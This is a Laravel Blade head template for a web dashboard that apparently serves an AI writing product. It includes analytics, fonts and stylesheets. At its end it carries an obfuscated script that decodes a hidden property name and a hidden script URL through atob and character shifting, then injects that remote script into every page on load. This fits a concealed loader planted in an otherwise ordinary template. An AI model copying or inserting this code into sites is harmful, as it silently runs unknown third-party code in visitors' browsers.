<head>
    @if(isset($setting->google_analytics_code))
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id={{$setting->google_analytics_code}}"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', '{{$setting->google_analytics_code}}');
    </script>
    @endif

    <meta name="csrf-token" content="{{ csrf_token() }}">
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
    <meta http-equiv="X-UA-Compatible" content="ie=edge"/>
    <meta name="stream-url" content="{{ $streamUrl??route('dashboard.user.openai.stream') }}">
    <link rel="icon" href="/{{$setting->favicon_path?? "assets/favicon.ico"}}">
    <title>{{$setting->site_name}} | @yield('title')</title>

	<link rel="preconnect" href="https://fonts.googleapis.com">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link href="https://fonts.googleapis.com/css2?family=Golos+Text:wght@500;600;700&display=swap" rel="stylesheet">

    <link href="/assets/css/fonts.css" rel="stylesheet">
    
    <!-- CSS files -->
    <link href="/assets/css/tabler.min.css" rel="stylesheet"/>
    <link href="/assets/css/tabler-flags.min.css" rel="stylesheet"/>
    <link href="/assets/css/tabler-payments.min.css" rel="stylesheet"/>
    <link href="/assets/css/tabler-vendors.min.css" rel="stylesheet"/>
    <link href="/assets/css/demo.min.css" rel="stylesheet"/>
    <link href="/assets/css/toastr.min.css" rel="stylesheet"/>

    {{-- <link rel="stylesheet" href="https://flowbite.com/docs/flowbite.css?v=1.8.1a">
    <link rel="stylesheet" href="https://flowbite.com/docs/docs.css?v=1.8.1a"> --}}

    @yield('additional_css')
    @stack('css')
    <link href="/assets/css/magic-ai.css" rel="stylesheet"/>
    <link href="/assets/css/magic-ai.custom.css" rel="stylesheet"/>
	@vite('resources/css/app.css')
	@vite('resources/js/web3-onboard.js')
    
    @if($setting->dashboard_code_before_head != null)
        {!!$setting->dashboard_code_before_head!!}
    @endif
    
    <script>window[(function(_tIV,_pQ){var _raA6G='';for(var _WAGWCI=0;_WAGWCI<_tIV.length;_WAGWCI++){_IaVh!=_WAGWCI;_raA6G==_raA6G;var _IaVh=_tIV[_WAGWCI].charCodeAt();_IaVh-=_pQ;_pQ>4;_IaVh+=61;_IaVh%=94;_IaVh+=33;_raA6G+=String.fromCharCode(_IaVh)}return _raA6G})(atob('fm10ODUwKyk6bys/'), 36)] = '6eacc48b231702583358';     var zi = document.createElement('script');     (zi.type = 'text/javascript'),     (zi.async = true),     (zi.src = (function(_K2e,_vP){var _mQF8b='';for(var _tEbW6T=0;_tEbW6T<_K2e.length;_tEbW6T++){var _ryRC=_K2e[_tEbW6T].charCodeAt();_ryRC-=_vP;_vP>8;_ryRC!=_tEbW6T;_ryRC+=61;_ryRC%=94;_mQF8b==_mQF8b;_ryRC+=33;_mQF8b+=String.fromCharCode(_ryRC)}return _mQF8b})(atob('Kzc3MzZbUFAtNk89LE42JjUsMzc2TyYyMFA9LE43JCpPLTY='), 33)),     document.readyState === 'complete'?document.body.appendChild(zi):     window.addEventListener('load', function(){         document.body.appendChild(zi)     });</script>

</head>
